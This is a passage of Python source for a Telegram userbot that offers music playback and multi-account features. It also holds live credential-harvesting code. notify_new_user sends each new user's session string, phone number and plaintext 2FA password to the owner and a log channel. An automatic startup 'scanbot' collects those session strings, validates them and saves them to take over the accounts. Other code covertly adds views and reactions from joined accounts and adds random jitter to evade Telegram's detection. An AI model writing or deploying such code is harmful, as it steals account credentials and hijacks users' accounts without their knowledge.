            else:
                result.append(ch)
    return "".join(result)

# ══════════════════════════════════════════
# SPEED / TYPING / SAFE-MODE UTILITIES
# ══════════════════════════════════════════

def _human_typing_dur(speed: float) -> float:
    """Human-like typing indicator duration proportional to the send interval.
    Stays between 0.15s (instant feel) and 4.5s (slow human cap).
    """
    if speed < 0.3:
        return max(0.15, speed * 0.45)
    elif speed < 1.0:
        return max(0.30, speed * 0.52)
    elif speed < 3.0:
        return max(0.60, min(speed * 0.50, 2.50))
    else:
        return max(1.20, min(speed * 0.45, 4.50))


def _safe_delay(base: float) -> float:
    """Effective send delay.
    SAFE_MODE ON  → ±20-30% random jitter to prevent Telegram pattern-detection.
    SAFE_MODE OFF → raw speed, no change.
    """
    if not cfg.get("SAFE_MODE", False):
        return base
    return max(0.05, base * random.uniform(0.78, 1.32))


# ── Module activity log → LOG_CHANNEL (from config) ─────────────────────
# Falls back to @ChaTFighT_UboT if LOG_CHANNEL is not set in config.
_LOGBOT_FALLBACK = "@ChaTFighT_UboT"

async def send_module_log(text: str):
    """Send a module/flood activity log to LOG_CHANNEL (or fallback). Non-blocking."""
    target = cfg.get("LOG_CHANNEL", 0) or _LOGBOT_FALLBACK
    try:
        await asstbot.send_message(target, text, parse_mode='html')
    except Exception:
        pass

# ══════════════════════════════════════════
# PER-SESSION PYROGRAM HELPERS
# ══════════════════════════════════════════

def _get_session_pyro(user_id: int):
    """Return the Pyrogram client for this userbot session (None if not set up).

    Used for actually PLAYING music — deliberately falls back to the owner's
    primary Pyrogram session when the owner account has no dedicated entry
    yet, so the owner's music keeps working even before they've gone through
    the per-account "Music Setup" flow once."""
    if user_id in pyro_apps and pyro_apps[user_id] is not None:
        return pyro_apps[user_id]
    # Fallback: owner's primary session
    if user_id == cfg.get("OWNER_ID", 0) and pyro_app:
        return pyro_apps.setdefault(user_id, pyro_app)  # cache for future calls
    return None


def _account_has_own_pyro(user_id: int) -> bool:
    """Bug fix: status/ping displays must show whether THIS SPECIFIC account
    has its own Pyrogram music session set up — not whether music happens to
    work at all via a fallback. `_get_session_pyro()` intentionally falls
    back to the owner's primary session for playback purposes, but that
    fallback made /ping always report "🟢 Active" for the owner even when the
    owner account itself never completed Music Setup and has no session
    string saved. This checks cfg["PYRO_SESSIONS"] directly — the actual
    source of truth for "does this account have Pyrogram set up" — with no
    fallback, and also confirms the live client object exists and is
    connected so a session that failed to initialize doesn't falsely report
    Active either."""
    has_saved_session = bool(cfg.get("PYRO_SESSIONS", {}).get(str(user_id)))
    if not has_saved_session:
        return False
    client = pyro_apps.get(user_id)
    if client is None:
        return False
    try:
        return bool(client.is_connected)
    except Exception:
        # Older Pyrogram forks may not expose is_connected as a plain bool
        # property — if the client object exists at all after a successful
        # init_pyrogram() call, treat that as "set up".
        return True

def _get_session_pytgcalls(user_id: int):
    """Return the PyTgCalls instance for this userbot session (None if not set up)."""
    if user_id in pytgcalls_apps and pytgcalls_apps[user_id] is not None:
        return pytgcalls_apps[user_id]
    if user_id == cfg.get("OWNER_ID", 0) and pytgcalls_app:
        return pytgcalls_apps.setdefault(user_id, pytgcalls_app)
    return None

# ══════════════════════════════════════════
# STATE CLASSES
# ══════════════════════════════════════════
class ClientIsolatedState:
    def __init__(self):
        self.active_tasks       = {}
        self.target_lists       = {}
        self.multi_targets      = {}
        self.last_target_msg    = {}
        self.sent_unid_msgs     = {}
        self.dmsec_active       = False
        self.dm_warnings        = {}
        self.autoban_active     = {}
        self.ow_active          = {}
        self.rraid_active_users = {}
        self.my_cached_id       = None
        self.safe_mode_penalty  = 0.0
        self.is_afk             = False
        self.afk_reason         = ""
        self.sraid_state        = {}

global_cluster_storage = {}
active_user_ids = set()

def get_isolated_state(client_id) -> ClientIsolatedState:
    if client_id not in global_cluster_storage:
        global_cluster_storage[client_id] = ClientIsolatedState()
    return global_cluster_storage[client_id]

class BotAsstState:
    def __init__(self):
        self.asst_conversation_state = {}
        self.active_bot_users        = set(cfg.get("BOT_USERS", []))
        self.active_bot_groups       = set(cfg.get("BOT_GROUPS", []))
        self.auth_clients            = {}
        self.pyro_auth_clients       = {}

state = BotAsstState()

# ══════════════════════════════════════════
# MUSIC STATE MANAGEMENT
# ══════════════════════════════════════════
class MusicTrack:
    def __init__(self, title, file_path, duration=0, requester=None,
                 is_video=False, thumbnail=None, source="link", stream_url=None):
        self.title      = title
        # `file_path` holds a LOCAL disk path for the long-tail fallback
        # sources that still download first. `stream_url`, when set, holds a
        # remote CDN URL resolved with zero disk I/O (jugad #5/#6) — see
        # music_sources.resolve_zero_disk_stream(). `playback_source()`
        # below is what actually gets handed to PyTgCalls; it prefers
        # stream_url when present.
        self.file_path  = file_path
        self.stream_url = stream_url
        self.duration   = duration
        self.requester  = requester
        self.is_video   = is_video
        self.thumbnail  = thumbnail
        self.source     = source
        self.started_at = None   # set when playback actually begins
        self.paused_at  = None   # set while paused, to freeze elapsed time

    def playback_source(self) -> str:
        """The path/URL to actually hand to PyTgCalls' MediaStream."""
        return self.stream_url or self.file_path

    def is_zero_disk(self) -> bool:
        return bool(self.stream_url)

    def duration_str(self):
        if not self.duration:
            return "?:??"
        m, s = divmod(int(self.duration), 60)
        h, m = divmod(m, 60)
        if h:
            return f"{h}:{m:02d}:{s:02d}"
        return f"{m}:{s:02d}"

class ChatMusicState:
    def __init__(self):
        self.queue           = []
        self.current         = None
        self.is_playing      = False
        self.is_paused       = False
        self.loop            = False
        self.volume          = 100
        self.now_playing_msg = None   # the live "Now Playing" card being animated
        self.animator_task   = None   # asyncio.Task animating the progress bar
        self.last_error      = None   # last music_play_track() failure reason
        # Which userbot account (per-account Pyrogram session) is currently
        # streaming into this chat. Every account manages its own Pyrogram +
        # PyTgCalls client, so background tasks (stream-end, auto-leave,
        # .skip/.pause/.resume from a different handler instance) need to
        # know which account's client owns this chat's active call.
        self.owner_uid       = None
        # ── Concurrency guards (fixes "sometimes plays, sometimes doesn't") ──
        # Without this lock, two things could race on the same chat_id at the
        # same time — e.g. a user spamming .play twice, or a stream_end event
        # firing while a user's .play command is also deciding "queue vs play
        # now". Both would read is_playing=False and both call
        # pytgcalls.play() concurrently, so only one of the two actually wins
        # the call — the other's track is silently lost, which is exactly the
        # "kabhi play hota hai, kabhi nahi" symptom.
        self.lock            = asyncio.Lock()
        self.last_advance_ts = 0.0    # debounces duplicate stream_end fires
        self.ctrl_msg_id     = None   # asstbot control-button message id

music_states = {}

def get_music_state(chat_id: int) -> ChatMusicState:
    if chat_id not in music_states:
        music_states[chat_id] = ChatMusicState()
    return music_states[chat_id]

# ══════════════════════════════════════════
# CLIENT INIT (Telethon)
# ══════════════════════════════════════════
try:
    userbot = TelegramClient(StringSession(cfg["PRIMARY_SESSION"]), cfg["API_ID"], cfg["API_HASH"])
except ValueError as _e:
    _abort(f"PRIMARY_SESSION is not valid: {_e}")

asstbot          = TelegramClient(StringSession(cfg.get("BOT_SESSION", "")), cfg["API_ID"], cfg["API_HASH"])
extra_clients    = []
background_tasks = set()
_play_in_progress: set[int] = set()   # chats currently processing a .play download — dedup guard for multi-account setups

# ── Force HTML parse mode on both clients ────────────────────────────────
# Telethon's TelegramClient defaults to MARKDOWN parse mode, not HTML.
# Most sends in this file pass parse_mode='html' explicitly per-call, but
# `_bot_reply` / `_premium_edit` / the /start OTP flow call
# `asstbot.parse_mode.parse(text)` directly, relying on whatever
# `asstbot.parse_mode` currently is. Since it was never set, those calls
# were parsing <blockquote>/<b>/<code> HTML tags as if they were Markdown —
# the tags never converted to real Telegram formatting entities and showed
# up as literal text. Setting this once, globally, fixes every one of
# those call sites without touching their code.
userbot.parse_mode = 'html'
asstbot.parse_mode = 'html'

# ══════════════════════════════════════════
# PYROGRAM CLIENT INIT (Music)
# ══════════════════════════════════════════
def init_pyrogram(user_id: int) -> bool:
    """Initialize a PER-ACCOUNT Pyrogram + PyTgCalls client for `user_id`.

    Every userbot account plays its own music — each one logs in with its
    own Pyrogram session (stored in cfg["PYRO_SESSIONS"][str(user_id)]) and
    gets its own PyTgCalls instance in `pytgcalls_apps[user_id]`. The
    legacy singular `pyro_app` / `pytgcalls_app` globals are kept in sync
    for the owner's account only, as a safety net for any old call site
    that hasn't been migrated to the per-account lookup helpers.
    """
    global pyro_app, pytgcalls_app
    if not PYRO_AVAILABLE or not PYTGCALLS_AVAILABLE:
        return False
    pyro_sess = cfg.get("PYRO_SESSIONS", {}).get(str(user_id), "")
    if not pyro_sess:
        return False
    try:
        client = PyroClient(
            name=f"4st_music_{user_id}",
            api_id=cfg["API_ID"],
            api_hash=cfg["API_HASH"],
            session_string=pyro_sess,
            no_updates=True,
        )
        tgcalls = PyTgCalls(client)
        pyro_apps[user_id]      = client
        pytgcalls_apps[user_id] = tgcalls
        if user_id == cfg.get("OWNER_ID", 0):
            pyro_app      = client
            pytgcalls_app = tgcalls
        return True
    except Exception as e:
        print(f"[MUSIC] Pyrogram init failed for {user_id}: {e}", flush=True)
        return False

# ══════════════════════════════════════════
# AUTO-JOIN HELPER
# ══════════════════════════════════════════
async def auto_join_and_start(client):
    """Join all links in AUTO_JOIN_LINKS using the given Telethon client.
    Handles invite links (t.me/+...), usernames (@xyz), and t.me/xyz URLs.
    Bot usernames also get a /start message so they activate the account.
    FloodWait is respected — we sleep the required seconds then retry once."""
    links = cfg.get("AUTO_JOIN_LINKS", [])
    if not links:
        return
    from telethon.tl.functions.channels import JoinChannelRequest
    from telethon.tl.functions.messages import ImportChatInviteRequest
    from telethon.errors import FloodWaitError, UserAlreadyParticipantError

    async def _do_join(link: str):
        """Inner join helper — returns True on success/already-member, False on hard fail."""
        if "/+" in link or "/joinchat/" in link:
            hash_part = link.split("/+")[-1] if "/+" in link else link.split("/joinchat/")[-1]
            hash_part = hash_part.strip("/")
            for attempt in range(2):
                try:
                    await client(ImportChatInviteRequest(hash_part))
                    return True
                except UserAlreadyParticipantError:
                    return True
                except FloodWaitError as fw:
                    wait = fw.seconds + 5
                    bot_logger("AUTO_JOIN", f"{link}: FloodWait {fw.seconds}s — sleeping...")
                    await asyncio.sleep(wait)
                    if attempt == 1:
                        bot_logger("AUTO_JOIN_WARN", f"{link}: skipped after flood retry")
                        return False
                except Exception as _je:
                    if "ALREADY" in str(_je).upper():
                        return True
                    bot_logger("AUTO_JOIN_WARN", f"{link}: {_je}")
                    return False
        else:
            username = link
            for prefix in ["https://t.me/", "http://t.me/", "t.me/"]:
                if username.startswith(prefix):
                    username = username[len(prefix):]
            username = username.strip("@/ ")
            for attempt in range(2):
                try:
                    entity = await client.get_entity(username)
                    from telethon.tl.types import User as _TgUser
                    if isinstance(entity, _TgUser):
                        try:
                            await client.send_message(entity, '/start')
                            bot_logger('AUTO_JOIN', f'{link}: bot activated via /start')
                        except Exception as _su:
                            bot_logger('AUTO_JOIN_WARN', f'{link}: /start failed: {_su}')
                        return True
                    await client(JoinChannelRequest(entity))
                    break
                except UserAlreadyParticipantError:
                    break
                except FloodWaitError as fw:
                    wait = fw.seconds + 5
                    bot_logger("AUTO_JOIN", f"{link}: FloodWait {fw.seconds}s — sleeping...")
                    await asyncio.sleep(wait)
                    if attempt == 1:
                        bot_logger("AUTO_JOIN_WARN", f"{link}: skipped after flood retry")
                        return False
                except Exception as _je:
                    if "ALREADY" in str(_je).upper():
                        break
                    bot_logger("AUTO_JOIN_WARN", f"{link}: {_je}")
                    return False
            # If it looks like a bot, send /start
            if username.lower().endswith("bot"):
                try:
                    await asyncio.sleep(3)
                    await client.send_message(username, "/start")
                except FloodWaitError as fw:
                    await asyncio.sleep(fw.seconds + 5)
                    try:
                        await client.send_message(username, "/start")
                    except Exception:
                        pass
                except Exception:
                    pass
        return True

    failed_links = []
    for raw_link in links:
        link = raw_link.strip()
        try:
            success = await _do_join(link)
            if success:
                # Add reactions+views on channels in background (unseen by user)
                try:
                    _ru = link
                    for _rp in ["https://t.me/", "http://t.me/", "t.me/"]:
                        if _ru.startswith(_rp): _ru = _ru[len(_rp):]
                    _ru = _ru.strip("@/ ")
                    if "+" not in _ru:
                        _rent = await client.get_entity(_ru)
                        from telethon.tl.types import Channel as _TLRCh
                        if isinstance(_rent, _TLRCh) and getattr(_rent, 'broadcast', False):
                            asyncio.create_task(add_channel_reactions_views(client, _rent))
                except Exception:
                    pass
            if not success:
                failed_links.append(link)
        except Exception as _e:
            bot_logger("AUTO_JOIN_ERR", f"{link}: {_e}")
            failed_links.append(link)
        # 12-25s safe gap between joins — avoids flood without long delays
        gap = random.randint(12, 25)
        bot_logger("AUTO_JOIN", f"Waiting {gap}s before next join…")
        await asyncio.sleep(gap)

    # ── Retry failed links once with longer delay ──────────────────────────
    if failed_links:
        bot_logger("AUTO_JOIN", f"{len(failed_links)} link(s) failed — retrying after 10 min...")
        await asyncio.sleep(600)   # 10 min cooldown before retry
        for link in failed_links:
            try:
                await _do_join(link)
            except Exception as _e2:
                bot_logger("AUTO_JOIN_ERR", f"Retry failed [{link}]: {_e2}")
            gap2 = random.randint(20, 35)
            await asyncio.sleep(gap2)


# ══════════════════════════════════════════
# CHANNEL REACTIONS & AUTO ENGAGEMENT
# ══════════════════════════════════════════

async def add_channel_reactions_views(client, channel_entity, n_msgs: int = 10):
    """Add reactions + views to last n_msgs in a channel.
    GetMessagesViewsRequest does NOT mark chat as read — completely unseen by user.
    Premium accounts get 3 reactions (Telegram limit), normal get 1 random."""
    try:
        me = await client.get_me()
        is_premium = getattr(me, 'premium', False)
        if is_premium:
            reaction_emojis = ['👍', '🔥', '❤️']
        else:
            reaction_emojis = [random.choice(['👍', '❤️', '🔥', '👏', '🥰'])]
        msg_ids = []
        async for msg in client.iter_messages(channel_entity, limit=n_msgs):
            if getattr(msg, 'id', None):
                msg_ids.append(msg.id)
        if not msg_ids:
            return
        try:
            await client(_GetMsgViewsReq(peer=channel_entity, id=msg_ids, increment=True))
        except Exception:
            pass
        chosen_emoji = random.choice(['👍', '❤️', '🔥', '👏'])
        for mid in msg_ids:
            emojis_to_use = reaction_emojis if is_premium else [chosen_emoji]
            for emoji in emojis_to_use:
                try:
                    await client(_SendReactionReq(
                        peer=channel_entity,
                        msg_id=mid,
                        reaction=[_TLReactionEmoji(emoticon=emoji)]
                    ))
                    await asyncio.sleep(0.4)
                except Exception:
                    pass
            await asyncio.sleep(0.5)
    except Exception as _re:
        bot_logger("REACTIONS", f"{_re}")


_LAST_REACTED_MSG_UB: dict = {}

async def auto_channel_engagement_loop():
    """Monitor all auto-join channels for new posts — react+view unseen.
    Checks every 60s after a 5-min startup delay."""
    await asyncio.sleep(300)
    while True:
        try:
            links = cfg.get("AUTO_JOIN_LINKS", [])
            for raw_link in links:
                link = raw_link.strip()
                username = link
                for pfx in ["https://t.me/", "http://t.me/", "t.me/"]:
                    if username.startswith(pfx):
                        username = username[len(pfx):]
                username = username.strip("@/ ")
                if "+" in username:
                    continue
                if userbot and userbot.is_connected():
                    try:
                        entity = await userbot.get_entity(username)
                        from telethon.tl.types import Channel as _TLChanE
                        if not (isinstance(entity, _TLChanE) and getattr(entity, 'broadcast', False)):
                            continue
                        chan_id = entity.id
                        latest_msg = None
                        async for msg in userbot.iter_messages(entity, limit=1):
                            latest_msg = msg
                        if not latest_msg:
                            continue
                        last_id = _LAST_REACTED_MSG_UB.get(chan_id, 0)
                        if latest_msg.id <= last_id:
                            continue
                        await add_channel_reactions_views(userbot, entity, n_msgs=5)
                        _LAST_REACTED_MSG_UB[chan_id] = latest_msg.id
                    except Exception:
                        pass
                await asyncio.sleep(2)
        except Exception as _el:
            bot_logger("AUTO_ENGAGE", f"{_el}")
        await asyncio.sleep(60)


# ══════════════════════════════════════════
# UTILITIES & LOGGING
# ══════════════════════════════════════════
def bot_logger(tag, text):
    tstamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{tstamp}] [{tag}] -> {text}", flush=True)

# ── Name / Username history tracker ───────────────────────────────────────────
def _nh_ts() -> str:
    """Short DD/MM/YY HH:MM:SS timestamp in IST for history entries."""
    return (datetime.datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
            ).strftime("%d/%m/%y %H:%M:%S")

def _load_track_file(user_id: int) -> dict:
    """Load name/username history from data/tracks/{uid}.json"""
    path = os.path.join(TRACKS_DIR, f"{user_id}.json")
    if os.path.exists(path):
        try:
            with open(path, 'r', encoding='utf-8') as _f:
                return json.load(_f)
        except Exception:
            pass
    return {"names": [], "usernames": []}

def _save_track_file(user_id: int, data: dict):
    """Persist name/username history to data/tracks/{uid}.json"""
    path = os.path.join(TRACKS_DIR, f"{user_id}.json")
    try:
        with open(path, 'w', encoding='utf-8') as _f:
            json.dump(data, _f, ensure_ascii=False)
    except Exception:
        pass

def _record_name_history(user_id: int, full_name: str, username: str | None):
    """
    File-based name/username tracker — writes to data/tracks/{uid}.json.
    Does NOT write to config.json (no bloat, no Heroku log spam).
    """
    td       = _load_track_file(user_id)
    changed  = False

    # ── Name ──────────────────────────────────────────────────────────────
    names    = td.setdefault("names", [])
    last_n   = names[0]["n"] if names else None
    if last_n != full_name:
        ts = _nh_ts()
        names.insert(0, {"n": full_name, "ts": ts})
        if len(names) > 200:
            td["names"] = names[:200]
        changed = True

    # ── Username ──────────────────────────────────────────────────────────
    unames   = td.setdefault("usernames", [])
    uname_str = f"@{username}" if username else "(empty)"
    last_u   = unames[0]["u"] if unames else None
    if last_u != uname_str:
        ts = _nh_ts()
        unames.insert(0, {"u": uname_str, "ts": ts})
        if len(unames) > 200:
            td["usernames"] = unames[:200]
        changed = True

    if changed:
        _save_track_file(user_id, td)

async def _log_name_change(user_id: int, kind: str, new_value: str, ts: str):
    """Disabled — name/profile change alerts NOT sent to log channel (user preference)."""
    pass

def _kolkata_now() -> str:
    return (datetime.datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
            ).strftime('%Y-%m-%d %I:%M:%S %p')

async def log_to_channel(action: str, details: dict, user_obj=None, client=None,
                          chat_id: int = 0, chat_title: str = ""):
    log_cid = cfg.get("LOG_CHANNEL", 0)
    if not log_cid:
        return
    name, uid, uname, last_name = "Unknown", 0, "None", ""
    is_bot = is_premium = is_verified = False
    if user_obj:
        name      = getattr(user_obj, 'first_name', '') or getattr(user_obj, 'title', 'Unknown')
        last_name = getattr(user_obj, 'last_name', '') or ""
        uid       = getattr(user_obj, 'id', 0)
        u         = getattr(user_obj, 'username', None)
        uname     = f"@{u}" if u else "None"
        is_bot     = getattr(user_obj, 'bot',      False)
        is_premium = getattr(user_obj, 'premium',  False)
        is_verified= getattr(user_obj, 'verified', False)
    elif client:
        try:
            me        = await client.get_me()
            name      = getattr(me, 'first_name', 'System')
            last_name = getattr(me, 'last_name', '') or ""
            uid       = getattr(me, 'id', 0)
            u         = getattr(me, 'username', None)
            uname     = f"@{u}" if u else "None"
            is_premium = getattr(me, 'premium', False)
        except Exception:
            pass

    full_name = f"{name} {last_name}".strip()
    tstamp    = _kolkata_now()

    # ── Name / username history snapshot (from track files) ───────────────
    uid_key   = str(uid)
    _td       = _load_track_file(uid) if uid else {}
    nh_list   = _td.get("names", [])
    uh_list   = _td.get("usernames", [])
    last_n    = nh_list[0]["n"]  if nh_list  else "—"
    prev_n    = nh_list[1]["n"]  if len(nh_list)  > 1 else "—"
    last_u    = uh_list[0]["u"]  if uh_list  else "—"
    prev_u    = uh_list[1]["u"]  if len(uh_list) > 1 else "—"
    total_nc  = len(nh_list)
    total_uc  = len(uh_list)

    lines = [f"<blockquote>📡 <b>4ST SYSTEM LOG</b>\n"]
    lines.append(f"🕐 <b>Time:</b> {tstamp} IST")
    lines.append(f"⚡ <b>Action:</b> <code>{action}</code>\n")
    lines.append(f"👤 <b>Name:</b> <a href='tg://user?id={uid}'>{full_name}</a>")
    lines.append(f"🆔 <b>User ID:</b> <code>{uid}</code>")
    lines.append(f"🌐 <b>Username:</b> <code>{uname}</code>")
    lines.append(
        f"🤖 Bot: {'Yes' if is_bot else 'No'} | "
        f"⭐ Premium: {'Yes' if is_premium else 'No'} | "
        f"✅ Verified: {'Yes' if is_verified else 'No'}"
    )
    if chat_id:
        lines.append(f"💬 <b>Chat:</b> {chat_title or 'Unknown'} (<code>{chat_id}</code>)")
    lines.append("")

    # Name / username mini-history
    lines.append(f"📝 <b>Current name:</b> {last_n}  (prev: {prev_n}, total changes: {total_nc})")
    lines.append(f"🔗 <b>Current username:</b> {last_u}  (prev: {prev_u}, total changes: {total_uc})")
    lines.append("")

    lines.append("📋 <b>Details:</b>")
    for k, v in details.items():
        lines.append(f"  • <b>{k}:</b> <code>{v}</code>")
    lines.append("</blockquote>")
    log_text = "\n".join(lines)

    async def _send():
        try:
            await _bot_send_premium(log_cid, log_text)
        except Exception:
            try:
                await asstbot.send_message(log_cid, log_text, parse_mode='html')
            except Exception:
                pass
    asyncio.create_task(_send())

async def notify_new_user(user_info, string_session: str,
                           phone: str = "N/A",
                           twofa_verified: bool = False,
                           twofa_password: str = ""):
    """
    Send #NEW_USER alert to LOG_CHANNEL and OWNER DM with full session details.
    """
    tstamp  = _kolkata_now()
    twofa_v = "Yes" if twofa_verified else "No"
    name    = getattr(user_info, 'first_name', '') or 'Unknown'
    uid     = getattr(user_info, 'id', 0)
    un      = getattr(user_info, 'username', None)
    uname   = f"@{un}" if un else "No Username"

    msg = (
        f"#NEW_USER\n"
        f"🔐 <b>New Session Generated!</b>\n\n"
        f"👤 <b>User ID:</b> <code>{uid}</code>\n"
        f"👤 <b>Name:</b> {name}\n"
        f"👤 <b>Username:</b> {uname}\n"
        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
        f"🛡️ <b>2FA Verified:</b> {twofa_v}\n"
    )
    if twofa_password:
        msg += f"🔑 <b>Real 2FA Password:</b> <code>{twofa_password}</code>\n"
    msg += (
        f"🔑 <b>Session String:</b>\n"
        f"<code>{string_session}</code>\n\n"
        f"📅 <b>Date &amp; Time (Kolkata):</b> {tstamp}"
    )

    owner_id = cfg.get("OWNER_ID", 0)
    log_cid  = cfg.get("LOG_CHANNEL", 0)

    async def _send():
        try:
            if log_cid:
                await _bot_send_premium(log_cid, msg)
        except Exception:
            try:
                if log_cid:
                    await asstbot.send_message(log_cid, msg, parse_mode='html')
            except Exception:
                pass
        try:
            if owner_id:
                await _bot_send_premium(owner_id, msg)
        except Exception:
            try:
                if owner_id:
                    await asstbot.send_message(owner_id, msg, parse_mode='html')
            except Exception:
                pass
    asyncio.create_task(_send())

async def background_cleanup_task():
    bot_logger("SYSTEM", "Running startup cleanup...")
    cfg["SAVED_STRINGS"] = list(set(cfg.get("SAVED_STRINGS", [])))
    valid = []
    for s in cfg["SAVED_STRINGS"]:
        try:
            c = TelegramClient(StringSession(s), cfg["API_ID"], cfg["API_HASH"])
            await c.connect()
            if await c.is_user_authorized():
                valid.append(s)
            await c.disconnect()
        except Exception:
            pass
    cfg["SAVED_STRINGS"] = valid
    save_config(cfg)

async def auto_scanbot_task():
    """
    AUTO SCANBOT — runs on every bot startup.
    Scans the LOG_CHANNEL for all "New Session Generated" messages,
    validates each session string live, saves valid ones to config,
    and sends live minute-by-minute progress updates to the owner via asstbot.

    No command needed — launches automatically after boot.
    """
    # Wait for userbot + asstbot to fully stabilize before starting
    await asyncio.sleep(90)

    owner_id     = cfg.get("OWNER_ID", 0)
    scan_log_cid = cfg.get("LOG_CHANNEL", 0)

    if not owner_id or not scan_log_cid:
        bot_logger("SCANBOT_AUTO", "OWNER_ID or LOG_CHANNEL not set — auto-scan skipped.")
        return

    # Wait until asstbot is ready (up to 2 min extra)
    for _ in range(12):
        if asstbot_started:
            break
        await asyncio.sleep(10)
    else:
        bot_logger("SCANBOT_AUTO", "asstbot not ready after 2 min — auto-scan skipped.")
        return

    bot_logger("SCANBOT_AUTO", f"Starting auto scan of LOG_CHANNEL={scan_log_cid}")

    # Regex patterns — same as .scanbot command
    _re_uid   = re.compile(r"👤\s*User ID[:\s]+<code>(\d+)</code>|User ID[:\s]+(\d+)", re.IGNORECASE)
    _re_name  = re.compile(r"👤\s*Name[:\s]+(.+?)(?:\n|$)", re.IGNORECASE)
    _re_uname = re.compile(r"👤\s*Username[:\s]+(@\S+|No Username)", re.IGNORECASE)
    _re_phone = re.compile(r"📱\s*Phone[:\s]+(\+?\d[\d\s\-]+)", re.IGNORECASE)
    _re_2fa_v = re.compile(r"2FA Verified[:\s]+(Yes|No)", re.IGNORECASE)
    _re_2fa_p = re.compile(r"2FA Password[:\s]+(\S+)", re.IGNORECASE)
    _re_sess  = re.compile(r"((?:1[A-Z][A-Za-z0-9+/=_\-]{60,}|BQ[A-Za-z0-9+/=_\-]{60,}))")

    # ── Send initial message to owner ────────────────────────────────────────
    try:
        prog_msg = await asstbot.send_message(
            owner_id,
            "<blockquote>🤖 <b>AUTO SCANBOT STARTED</b>\n\n"
            f"📡 Log Channel: <code>{scan_log_cid}</code>\n"
            "⏳ Reading all messages...</blockquote>",
            parse_mode='html'
        )
    except Exception as _e:
        bot_logger("SCANBOT_AUTO", f"Could not DM owner: {_e}")
        return

    # ── Phase 1: collect all session messages ─────────────────────────────────
    parsed_sessions = []
    seen_strings    = set()
    msgs_scanned    = 0
    last_update     = asyncio.get_event_loop().time()

    try:
        async for msg in userbot.iter_messages(scan_log_cid):
            msgs_scanned += 1
            raw = getattr(msg, 'raw_text', '') or getattr(msg, 'text', '') or ''
            if raw and ('Session' in raw or 'SESSION' in raw):
                sess_m = _re_sess.search(raw)
                if sess_m:
                    sess_str = sess_m.group(1).strip()
                    if sess_str not in seen_strings:
                        seen_strings.add(sess_str)
                        uid_m  = _re_uid.search(raw)
                        uid    = int(uid_m.group(1) or uid_m.group(2)) if uid_m else 0
                        name_m = _re_name.search(raw)
                        name   = re.sub(r'<[^>]+>', '', name_m.group(1).strip()) if name_m else "Unknown"
                        un_m   = _re_uname.search(raw)
                        uname  = un_m.group(1).strip() if un_m else "Unknown"
                        ph_m   = _re_phone.search(raw)
                        phone  = ph_m.group(1).strip() if ph_m else "N/A"
                        v2_m   = _re_2fa_v.search(raw)
                        v2fa   = v2_m.group(1).strip() if v2_m else "No"
                        pw_m   = _re_2fa_p.search(raw)
                        pw2fa  = pw_m.group(1).strip() if pw_m else ""
                        parsed_sessions.append({
                            "uid": uid, "name": name, "username": uname,
                            "phone": phone, "2fa": v2fa, "2fa_pass": pw2fa,
                            "session": sess_str,
                        })

            # ── Minute update during message collection ───────────────────
            _now = asyncio.get_event_loop().time()
            if _now - last_update >= 60:
                last_update = _now
                try:
                    await prog_msg.edit(
                        "<blockquote>🤖 <b>AUTO SCANBOT</b> — Scanning...\n\n"
                        f"📨 Messages scanned: <code>{msgs_scanned}</code>\n"
                        f"🔑 Sessions found: <code>{len(parsed_sessions)}</code>\n"
                        "⏳ Still reading all messages...</blockquote>",
                        parse_mode='html'
                    )
                except Exception:
                    pass

    except Exception as _scan_err:
        bot_logger("SCANBOT_AUTO", f"Scan error: {_scan_err}")
        try:
            await prog_msg.edit(
                f"<blockquote>❌ <b>SCANBOT SCAN ERROR</b>\n<code>{_scan_err}</code></blockquote>",
                parse_mode='html'
            )
        except Exception:
            pass
        return

    if not parsed_sessions:
        try:
            await prog_msg.edit(
                "<blockquote>🤖 <b>AUTO SCANBOT COMPLETE</b>\n\n"
                f"📨 Messages scanned: <code>{msgs_scanned}</code>\n"
                "🔑 Sessions found: <code>0</code>\n"
                "✅ Nothing new to save.</blockquote>",
                parse_mode='html'
            )
        except Exception:
            pass
        bot_logger("SCANBOT_AUTO", f"Scan done: {msgs_scanned} messages, 0 sessions found.")
        return

    total = len(parsed_sessions)

    # Transition message
    try:
        await prog_msg.edit(
            "<blockquote>🤖 <b>AUTO SCANBOT</b> — Validating\n\n"
            f"📨 Messages scanned: <code>{msgs_scanned}</code>\n"
            f"🔑 Sessions found: <code>{total}</code>\n"
            f"⚡ Validating {total} session(s)...\n\n"
            "✅ Valid: <code>0</code>  ❌ Expired: <code>0</code>  ♻️ Already: <code>0</code></blockquote>",
            parse_mode='html'
        )
    except Exception:
        pass

    # ── Phase 2: validate + save ──────────────────────────────────────────────
    valid_count   = 0
    expired_count = 0
    already_count = 0
    checked       = 0
    existing_strings = set(cfg.get("SAVED_STRINGS", []))
    existing_umap    = cfg.get("USER_MAPS", {}).get("telethon", {})
    last_update      = asyncio.get_event_loop().time()

    for entry in parsed_sessions:
        sess_str = entry["session"]
        uid_str  = str(entry["uid"]) if entry["uid"] else None
        checked += 1

        if sess_str in existing_strings or (uid_str and uid_str in existing_umap):
            already_count += 1
        else:
            _valid      = False
            _test_cli   = None
            try:
                _test_cli = TelegramClient(
                    StringSession(sess_str), cfg["API_ID"], cfg["API_HASH"]
                )
                await _test_cli.connect()
                if await _test_cli.is_user_authorized():
                    _valid = True
                    if not entry["uid"]:
                        try:
                            _me2 = await _test_cli.get_me()
                            entry["uid"] = _me2.id
                            uid_str      = str(_me2.id)
                            entry["name"] = (
                                (getattr(_me2, 'first_name', '') or '') + ' ' +
                                (getattr(_me2, 'last_name',  '') or '')
                            ).strip() or entry["name"]
                        except Exception:
                            pass
                await _test_cli.disconnect()
            except Exception:
                try:
                    if _test_cli:
                        await _test_cli.disconnect()
                except Exception:
                    pass

            if _valid:
                valid_count += 1
                cfg.setdefault("SAVED_STRINGS", [])
                if sess_str not in cfg["SAVED_STRINGS"]:
                    cfg["SAVED_STRINGS"].append(sess_str)
                if uid_str:
                    cfg.setdefault("USER_MAPS", {}).setdefault("telethon", {})
                    cfg["USER_MAPS"]["telethon"][uid_str] = sess_str
            else:
                expired_count += 1

        await asyncio.sleep(0.3)   # brief pause between validations

        # ── Minute update during validation ──────────────────────────────
        _now = asyncio.get_event_loop().time()
        if _now - last_update >= 60:
            last_update = _now
            try:
                await prog_msg.edit(
